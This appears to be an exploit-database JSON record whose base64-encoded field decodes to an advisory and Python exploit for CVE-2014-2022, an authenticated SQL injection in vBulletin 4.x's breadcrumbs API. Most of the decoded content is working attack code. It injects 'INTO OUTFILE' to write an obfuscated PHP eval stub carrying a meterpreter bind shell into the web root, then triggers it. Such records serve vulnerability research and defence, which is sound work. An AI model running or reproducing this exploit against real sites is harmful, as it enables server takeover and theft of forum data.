{
    "source": "exploit-database", 
    "exploit": "Q1ZFLTIwMTQtMjAyMiAtIHZidWxsZXRpbiA0LnggLSBTUUxpIGluIGJyZWFkY3J1bWJzIHZpYSB4bWxycGMgQVBJIChwb3N0LWF1dGgpDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCg0KT3ZlcnZpZXcNCi0tLS0tLS0tDQoNCglkYXRlICAgIDogIDEwLzEyLzIwMTQgICANCgljdnNzICAgIDogIDcuMSAoQVY6Ti9BQzpIL0F1OlMvQzpDL0k6Qy9BOkMpIGJhc2UNCgljd2UgICAgIDogIDg5ICAgDQoJDQoJdmVuZG9yICA6IHZCdWxsZXRpbiBTb2x1dGlvbnMNCglwcm9kdWN0IDogdkJ1bGxldGluIDQNCgl2ZXJzaW9ucyBhZmZlY3RlZCA6ICBsYXRlc3QgNC54ICh0byBkYXRlKTsgdmVyaWZpZWQgPD0gNC4yLjINCgkJCSogdkJ1bGxldGluIDQuMi4yICAgICAodmVyaWZpZWQpICANCgkJCSogdkJ1bGxldGluIDQuMi4xICAgICAodmVyaWZpZWQpICANCgkJCSogdkJ1bGxldGluIDQuMi4wIFBMMiAodmVyaWZpZWQpICANCgkJCQkJCQ0KCWV4cGxvaXRhYmlsaXR5IDoNCgkJCSogcmVtb3RlbHkgZXhwbG9pdGFibGUNCgkJCSogcmVxdWlyZXMgYXV0aGVudGljYXRpb24gKGFwaWtleSkNCgkJCQkNCglwYXRjaCBhdmFpbGFiaWxpdHkgKHRvIGRhdGUpIDogIE5vbmUNCgkJCQkNCkFic3RyYWN0DQotLS0tLS0tLS0NCiANCgl2QnVsbGV0aW4gNCBkb2VzIG5vdCBwcm9wZXJseSBzYW5pdGl6ZSBwYXJhbWV0ZXJzIHRvIGJyZWFkY3J1bWJzX2NyZWF0ZSBhbGxvd2luZw0KCWFuIGF0dGFja2VyIHRvIGluamVjdCBhcmJpdHJhcnkgU1FMIGNvbW1hbmRzIChTRUxFQ1QpLg0KCQ0KCXJpc2s6ICByYXRoZXIgbG93IC0gZHVlIHRvIHRoZSBmYWN0IHRoYXQgeW91IHRoZSBhcGkga2V5IGlzIHJlcXVpcmVkDQoJCSAgIHlvdSBjYW4gcHJvYmFibHkgdXNlIENWRS0yMDE0LTIwMjMgdG8gb2J0YWluIHRoZSBhcGkga2V5DQoNCg0KDQpEZXRhaWxzDQotLS0tLS0tLQ0KCQ0KCXZ1bG5lcmFibGUgY29tcG9uZW50OiANCgkJLi9pbmNsdWRlcy9hcGkvNC9icmVhZGNydW1ic19jcmVhdGUucGhwDQoJdnVsbmVyYWJsZSBhcmd1bWVudDoNCgkJY29uY2VwdGlkDQoJDQoJd2hpY2ggaXMgc2FuaXRpemVkIGFzIFRZUEVfU1RSSU5HIHdoaWNoIGRvZXMgbm90IHByZXZlbnQgU1FMIGluamVjdGlvbnMuDQoNCg0KUHJvb2Ygb2YgQ29uY2VwdCAoUG9DKQ0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQoJc2VlIGh0dHBzOi8vZ2l0aHViLmNvbS90aW50aW53ZWIvcHViL3RyZWUvbWFzdGVyL3BvY3MvY3ZlLTIwMTQtMjAyMg0KCQ0KCQ0KCTEpIHByZXJlcXVpc2l0ZXMNCgkxLjEpIGVuYWJsZSBBUEksIGdlbmVyYXRlIEFQSS1rZXkNCgkJIGxvZ29uIHRvIEFkbWluQ1ANCgkJIGdvdG8gInZCdWxsZXRpbiBBUEkiLT4iQVBJLUtleSIgYW5kIGVuYWJsZSB0aGUgQVBJIGludGVyZmFjZSwgZ2VuZXJhdGUga2V5DQoJMikgcnVuIFBvQw0KCQkgZWRpdCBQb0MgdG8gbWF0Y2ggeW91ciBUQVJHRVQsIEFQSUtFWSAoLCBvcHRpb25hbGx5IERFQlVHTEVWRUwpDQoJCSBwcm92aWRlIFdXV19ESVIgd2hpY2ggaXMgdGhlIHBsYWNlIHRvIHdyaXRlIHRoZSBwaHBfc2hlbGwgdG8gKG15c3FsIG11c3QgaGF2ZSBwZXJtaXNzaW9ucyBmb3IgdGhhdCBmb2xkZXIpDQoJCSBOb3RlOiBtZXRlcnByZXRlcl9iaW5kX3RjcCBpcyBub3QgcHJvdmlkZWQNCgkJIHJ1biBQb0MsIHdhaXQgZm9yIFNVQ0NFU1MhIG1lc3NhZ2UNCgkJIE5vdGU6IHBvYyB3aWxsIHRyaWdnZXIgbWV0ZXJwcmV0ZXIgc2hlbGwNCgkJIA0KCW1ldGVycHJldGVyIFBvQyBzY2VuYXJpbyByZXF1aXJlcyB0aGUgbXlzcWwgdXNlciB0byBoYXZlIHdyaXRlIHBlcm1pc3Npb25zIA0KCXdoaWNoIG1heSBub3QgYmUgdGhlIGNhc2UgaW4gc29tZSBkZWZhdWx0IGluc3RhbGxhdGlvbnMuDQoJDQoJDQpUaW1lbGluZQ0KLS0tLS0tLS0NCg0KCTIwMTQtMDEtMTQ6IGluaXRpYWwgdmVuZG9yIGNvbnRhY3QsIG5vIHJlc3BvbnNlDQoJMjAxNC0wMi0yNDogdmVuZG9yIGNvbnRhY3QsIG5vIHJlc3BvbnNlDQoJMjAxNC0xMC0xMzogcHVibGljIGRpc2Nsb3N1cmUNCgkNCkNvbnRhY3QNCi0tLS0tLS0tDQoJdGludGlud2ViIC0gaHR0cHM6Ly9naXRodWIuY29tL3RpbnRpbndlYi9wdWIvdHJlZS9tYXN0ZXIvcG9jcy9jdmUtMjAxNC0yMDIyDQoJDQoJDQooMHg3MjE0MjdEOCkNCgkNCi0gLSAtDQoNCiMhL3Vzci9iaW4vZW52IHB5dGhvbg0KIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCicnJw0KQGF1dGhvcjogdGludGlud2ViIDB4NzIxNDI3RDgNCicnJw0KaW1wb3J0IHVybGxpYjIsIGNvb2tpZWxpYiwgdXJsbGliLCBqc29uLCBoYXNobGliDQoNCmNsYXNzIEV4cGxvaXQob2JqZWN0KToNCiAgICANCiAgICBiYXNldXJsID0gTm9uZQ0KICAgIGNvb2tpZXMgPSBOb25lDQogICAgDQogICAgZGVmIF9faW5pdF9fKHNlbGYsYmFzZXVybCxwYXJhbXMsIGRlYnVnbGV2ZWw9MSk6DQogICAgICAgIHNlbGYuY29va2llcyA9IGNvb2tpZWxpYi5MV1BDb29raWVKYXIoKQ0KICAgICAgICBoYW5kbGVycyA9IFsNCiAgICAgICAgICAgICAgICAgICAgdXJsbGliMi5IVFRQSGFuZGxlcihkZWJ1Z2xldmVsPWRlYnVnbGV2ZWwpLA0KICAgICAgICAgICAgICAgICAgICB1cmxsaWIyLkhUVFBTSGFuZGxlcihkZWJ1Z2xldmVsPWRlYnVnbGV2ZWwpLA0KICAgICAgICAgICAgICAgICAgICB1cmxsaWIyLkhUVFBDb29raWVQcm9jZXNzb3Ioc2VsZi5jb29raWVzKQ0KICAgICAgICAgICAgICAgICAgICBdDQogICAgICAgIHNlbGYuYnJvd3NlciA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKCpoYW5kbGVycykNCiAgICAgICAgc2VsZi5iYXNldXJsPWJhc2V1cmwNCiAgICAgICAgc2VsZi5wYXJhbXMgPSBwYXJhbXMNCiAgICANCiAgICBkZWYgY2FsbChzZWxmLHBhdGg9IiIsZGF0YT17fSk6DQogICAgICAgIGFzc2VydChpc2luc3RhbmNlKGRhdGEsZGljdCkpDQogICAgICAgIGRhdGEgPSB1cmxsaWIudXJsZW5jb2RlKGRhdGEpDQoNCiAgICAgICAgcmVxID0gdXJsbGliMi5SZXF1ZXN0KCIlcyVzIiUoc2VsZi5iYXNldXJsLHBhdGgpLGRhdGEpDQogICAgICAgIHJlcS5hZGRfaGVhZGVyKCJDb250ZW50LVR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIikNCg0KICAgICAgICByZXR1cm4gc2VsZi5icm93c2VyLm9wZW4ocmVxKQ0KICAgIA0KICAgIGRlZiBjYWxsX2pzb24oc2VsZixwYXRoPU5vbmUsZGF0YT17fSk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHg9c2VsZi5jYWxsKHBhdGgsZGF0YSkucmVhZCgpDQogICAgICAgICAgICBwcmludCAicmF3X3Jlc3BvbnNlIiwgeA0KICAgICAgICAgICAgcmVzcCA9ICBqc29uLmxvYWRzKHgpDQogICAgICAgIGV4Y2VwdCB1cmxsaWIyLkhUVFBFcnJvciwgaGU6DQogICAgICAgICAgICByZXNwID0gaGUucmVhZCgpDQogICAgICAgIHJldHVybiByZXNwDQoNCg0KICAgIGRlZiB2Yl9pbml0X2FwaShzZWxmKToNCiAgICAgICAgcGFyYW1zID0geydhcGlfbSc6J2FwaV9pbml0J30NCiAgICAgICAgcGFyYW1zLnVwZGF0ZShzZWxmLnBhcmFtcykNCiAgICAgICAgZGF0YSA9IHNlbGYuY2FsbF9qc29uKCI/JXMiJSh1cmxsaWIudXJsZW5jb2RlKHBhcmFtcykpKSAgDQogICAgICAgIHNlbGYuc2Vzc2lvbiA9IGRhdGENCiAgICAgICAgcmV0dXJuIGRhdGENCiAgICANCiAgICBkZWYgdmJfY2FsbChzZWxmLCBwYXJhbXMpOg0KICAgICAgICBhcGlfc2lnID0gc2VsZi5fdmJfYnVpbGRfYXBpX3NpZyhwYXJhbXMpDQogICAgICAgIHJlcV9wYXJhbXMgPSBzZWxmLl92Yl9idWlsZF9yZWdzdHJpbmcoYXBpX3NpZykNCiAgICAgICAgcGFyYW1zLnVwZGF0ZShyZXFfcGFyYW1zKQ0KICAgICAgICBkYXRhID0gc2VsZi5jYWxsX2pzb24oIj8lcyIlKHVybGxpYi51cmxlbmNvZGUocGFyYW1zKSksZGF0YT1wYXJhbXMpDQogICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGRhdGEsIGRpY3QpOg0KICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgaWYgJ2Vycm9ybWVzc2FnZScgaW4gZGF0YVsncmVzcG9uc2UnXS5rZXlzKCk6DQogICAgICAgICAgICByYWlzZSBFeGNlcHRpb24oZGF0YSkNCiAgICAgICAgcmV0dXJuIGRhdGENCg0KICAgIGRlZiBfa3NvcnQoc2VsZiwgZCk6DQogICAgICAgIHJldCA9IFtdDQogICAgICAgIGZvciBrZXksIHZhbHVlIGluIFsoayxkW2tdKSBmb3IgayBpbiBzb3J0ZWQoZC5rZXlzKCkpXToNCiAgICAgICAgICAgIHJldC5hcHBlbmQoICIlcz0lcyIlKGtleSx2YWx1ZSkpDQogICAgICAgIHJldHVybiAiJiIuam9pbihyZXQpDQoNCiAgICBkZWYgX2tzb3J0X3VybGVuY29kZShzZWxmLCBkKToNCiAgICAgICAgcmV0ID0gW10NCiAgICAgICAgZm9yIGtleSwgdmFsdWUgaW4gWyhrLGRba10pIGZvciBrIGluIHNvcnRlZChkLmtleXMoKSldOg0KICAgICAgICAgICAgcmV0LmFwcGVuZCggdXJsbGliLnVybGVuY29kZSh7a2V5OnZhbHVlfSkpDQogICAgICAgIHJldHVybiAiJiIuam9pbihyZXQpDQoNCiAgICBkZWYgX3ZiX2J1aWxkX2FwaV9zaWcoc2VsZiwgcGFyYW1zKToNCiAgICAgICAgYXBpa2V5ID0gc2VsZi5wYXJhbXNbJ2FwaWtleSddDQogICAgICAgIGxvZ2luX3N0cmluZyA9IHNlbGYuX2tzb3J0X3VybGVuY29kZShwYXJhbXMpDQogICAgICAgIGFjY2Vzc190b2tlbiA9IHN0cihzZWxmLnNlc3Npb25bJ2FwaWFjY2Vzc3Rva2VuJ10pDQogICAgICAgIGNsaWVudF9pZCA9IHN0cihzZWxmLnNlc3Npb25bJ2FwaWNsaWVudGlkJ10pDQogICAgICAgIHNlY3JldCA9IHN0cihzZWxmLnNlc3Npb25bJ3NlY3JldCddKQ0KICAgICAgICByZXR1cm4gaGFzaGxpYi5tZDUobG9naW5fc3RyaW5nK2FjY2Vzc190b2tlbitjbGllbnRfaWQrc2VjcmV0K2FwaWtleSkuaGV4ZGlnZXN0KCkNCiAgICANCiAgICBkZWYgX3ZiX2J1aWxkX3JlZ3N0cmluZyhzZWxmLCBhcGlfc2lnKToNCiAgICAgICAgcGFyYW1zID0gew0KICAgICAgICAgICAgICAgICAgJ2FwaV9jJzpzZWxmLnNlc3Npb25bJ2FwaWNsaWVudGlkJ10sDQogICAgICAgICAgICAgICAgICAnYXBpX3MnOnNlbGYuc2Vzc2lvblsnYXBpYWNjZXNzdG9rZW4nXSwNCiAgICAgICAgICAgICAgICAgICdhcGlfc2lnJzphcGlfc2lnLA0KICAgICAgICAgICAgICAgICAgJ2FwaV92JzpzZWxmLnNlc3Npb25bJ2FwaXZlcnNpb24nXSwNCiAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHBhcmFtcw0KICAgIA0KDQppZiBfX25hbWVfXz09Il9fbWFpbl9fIjoNCiAgICBUQVJHRVQgPSAiaHR0cDovLzE5Mi4xNjguMjIwLjEzMS92YmI0L2FwaS5waHAiDQogICAgQVBJS0VZID0gIjRGQVZjUkRjIg0KICAgIFJFTU9URV9TSEVMTF9QQVRIID0gIi92YXIvd3d3L215U2hlbGwucGhwIg0KICAgIFRSSUdHRVJfVVJMID0gImh0dHA6Ly8xOTIuMTY4LjIyMC4xMzEvbXlTaGVsbC5waHAiDQogICAgREVCVUdMRVZFTCA9IDAgICAgICAgICAgIyAxIHRvIGVuYWJsZSByZXF1ZXN0IHRyYWNraW5nDQogICAgDQoNCiAgICAjIyMgMi4gc3FsaSAtIHNpbXBsZSAtIHdyaXRlIG91dGZpbGUNCiAgICBwcmludCAiWyAgMiBdIC0gc3FsaSAtIGluamVjdCAnaW50byBvdXRmaWxlJyB0byBjcmVhdGUgZmlsZSB4eHh4eC5waHAiDQogICAgcGFyYW1zID0geydjbGllbnRuYW1lJzonZmFuY3lfZXhwbG9pdF9jbGllbnQnLA0KICAgICAgICAgICAgICdjbGllbnR2ZXJzaW9uJzonMS4wJywNCiAgICAgICAgICAgICAncGxhdGZvcm1uYW1lJzonZXhwbG9pdCcsDQogICAgICAgICAgICAgJ3BsYXRmb3JtdmVyc2lvbic6JzEuNScsDQogICAgICAgICAgICAgJ3VuaXF1ZWlkJzonMTIzNCcsDQogICAgICAgICAgICAgJ2FwaWtleSc6QVBJS0VZfSANCiAgICB4ID0gRXhwbG9pdChiYXNldXJsPVRBUkdFVCxwYXJhbXM9cGFyYW1zKQ0KICAgIA0KICAgIHZhcnMgPSB4LnZiX2luaXRfYXBpKCkNCiAgICBwcmludCB2YXJzDQogICAgJycnDQogICAgeC52Yl9jYWxsKHBhcmFtcz17J2FwaV9tJzonYnJlYWRjcnVtYnNfY3JlYXRlJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgJ3R5cGUnOid0JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgIydjb25jZXB0aWQnOiIxIHVuaW9uIHNlbGVjdCAxIGludG8gT1VURklMRSAnJXMnIiVSRU1PVEVfU0hFTExfUEFUSCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbmNlcHRpZCc6IjEgdW5pb24gc2VsZWN0IDEgaW50byBPVVRGSUxFICclcyciJShSRU1PVEVfU0hFTExfUEFUSCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgfSkNCiAgICANCiAgICBwcmludCAiWyAgICpdIFNVQ0NFU1MhIC0gY3JlYXRlZCBmaWxlICVzIiVUUklHR0VSX1VSTA0KICAgICcnJw0KICAgICMjIyAzLiBzcWxpIC0gcHV0IG1ldGVycHJldGVyIHNoZWxsIGFuZCB0cmlnZ2VyIGl0DQogICAgcHJpbnQgIlsgIDMgXSAtIHNxbGkgLSBtZXRlcnByZXRlciBzaGVsbCArIHRyaWdnZXIiDQogICAgd2l0aCBvcGVuKCIuL21ldGVycHJldGVyX2JpbmRfdGNwIikgYXMgZjoNCiAgICAgICAgc2hlbGwgPSBmLnJlYWQoKQ0KDQogICAgc2hlbGwgPSBzaGVsbC5yZXBsYWNlKCI8P3BocCIsIiIpLnJlcGxhY2UoIj8+IiwiIikgICAgICAgICAgI2NsZWFudXAgdGFncw0KICAgIHNoZWxsID0gc2hlbGwuZW5jb2RlKCJiYXNlNjQiKS5yZXBsYWNlKCJcbiIsIiIpICAgICAjZW5jb2RlIHBheWxvYWQNCiAgICBzaGVsbCA9ICI8P3BocCBldmFsKGJhc2U2NF9kZWNvZGUoJyVzJykpOyA/PiIlc2hlbGwgIyBhZGQgZGVjb2RlcnN0dWINCiAgICBzaGVsbCA9ICIweCIrc2hlbGwuZW5jb2RlKCJoZXgiKSAgICAgICAgICAgICAgICAgICAgIyBmb3IgbXlzcWwgb3V0ZmlsZQ0KICAgIA0KIA0KICAgIHgudmJfY2FsbChwYXJhbXM9eydhcGlfbSc6J2JyZWFkY3J1bWJzX2NyZWF0ZScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICd0eXBlJzondCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICdjb25jZXB0aWQnOiIxIHVuaW9uIHNlbGVjdCAlcyBpbnRvIE9VVEZJTEUgJyVzJyIlKHNoZWxsLFJFTU9URV9TSEVMTF9QQVRIKX0pICAgICANCiAgICBwcmludCAiWyAgICpdIFNVQ0NFU1MhIC0gdHJpZ2dlcmluZyBzaGVsbCAuLiAoc2NyaXB0IHNob3VsZCBub3QgZXhpdCkiDQogICAgcHJpbnQgIlsgICAgXSBleHBsb2l0OiAjPiAgbXNmY2xpIG11bHRpL2hhbmRsZXIgUEFZTE9BRD1waHAvbWV0ZXJwcmV0ZXIvYmluZF90Y3AgTFBPUlQ9NDQ0NCBSSE9TVD08VEFSR0VUX0lQPiBFIg0KICAgIHByaW50ICJbICAgKl0gc2hlbGwgYWN0aXZlIC4uLiB3YWl0aW5nIGZvciBpdCB0byBkaWUgLi4uIg0KICAgIHByaW50IHVybGxpYjIudXJsb3BlbihUUklHR0VSX1VSTCkgICANCiAgICBwcmludCAiWyAgICBdIHNoZWxsIGRpZWQhIg0KICAgIHByaW50ICItLSBxdWl0IC0tIg==", 
    "filename": "platforms/php/webapps/40115.py", 
    "id": "40115", 
    "cves": [
        "CVE-2014-2022", 
        "CVE-2014-2023"
    ]
}